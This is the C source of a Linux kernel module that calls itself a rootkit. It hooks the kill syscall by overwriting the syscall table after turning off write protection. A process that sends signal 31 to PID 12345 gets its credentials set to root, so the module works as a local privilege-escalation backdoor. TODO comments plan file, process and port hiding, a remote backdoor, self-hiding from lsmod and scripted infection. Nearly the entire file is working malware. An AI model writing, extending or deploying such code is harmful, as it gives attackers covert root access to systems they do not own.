#include <asm/unistd.h>
#include <linux/highmem.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>

// TODO 
// Hide files, processes, and ports
// Remote backdoor
// Hide self from lsmod and other commands
// Rootkit should find the sys_call_table programmatically
// Bash script to automate infecting system?

// for local backdoor
#define LOCAL_PID 12345
#define LOCAL_SIG 31

// for writing to sys_call_table
#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

unsigned long *sys_call_table = (unsigned long*)0xc15b0000;  // hard coded, grep /boot/System.map

typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig); // for casting to avoid warnings
kill_ptr orig_kill;

asmlinkage int hacked_kill(pid_t pid, int sig)
{
	int actual_result;
	if (pid == LOCAL_PID && sig == LOCAL_SIG) {
		struct cred *cred;
		cred = (struct cred *)__task_cred(current);
		cred->uid = 0;
		cred->gid = 0;
		cred->suid = 0;
		cred->sgid = 0;
		cred->euid = 0;
		cred->egid = 0;
		cred->fsuid = 0;
		cred->fsgid = 0;
		return 0;
	}

	actual_result = (*orig_kill)(pid,sig);
	return actual_result;
}

int rootkit_init(void) {
	GPF_DISABLE;
	orig_kill = (kill_ptr)sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
	GPF_ENABLE;
	printk(KERN_INFO "Loading rootkit\n");
    	return 0;
}

void rootkit_exit(void) {
	GPF_DISABLE;
	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	GPF_ENABLE;
	printk(KERN_INFO "Removing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkit");
MODULE_AUTHOR("Josh Imhoff");
